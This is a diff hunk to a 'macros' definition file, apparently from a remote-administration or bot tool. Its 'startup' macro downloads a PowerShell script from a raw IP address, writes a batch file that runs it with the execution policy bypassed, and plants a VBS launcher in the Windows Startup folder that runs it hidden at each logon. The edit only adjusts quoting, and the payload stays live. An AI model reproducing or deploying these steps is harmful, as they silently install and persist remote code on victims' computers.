@@ -27,7 +27,7 @@ macros = {
     "startup": {"args": [], "steps": [
             "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; }",
             "Invoke-WebRequest -Uri 'http://194.195.244.202:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
-            "Write-Output 'powershell.exe -ExecutionPolicy Bypass C:\IFound/mogus.ps1' | Out-File ifound.bat -encoding ASCII",
+            "Write-Output 'powershell.exe -ExecutionPolicy Bypass C:\IFound/mogus.ps1' | Out-File 'ifound.bat' -encoding ASCII",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'Set WinScriptHost = CreateObject(\"WScript.Shell\")\nWinScriptHost.Run Chr(34) & \"C:\\IFound\\ifound.bat\" & Chr(34), 0\nSet WinScriptHost = Nothing' | Out-File ifound.vbs -encoding ASCII",
             "cd ~"
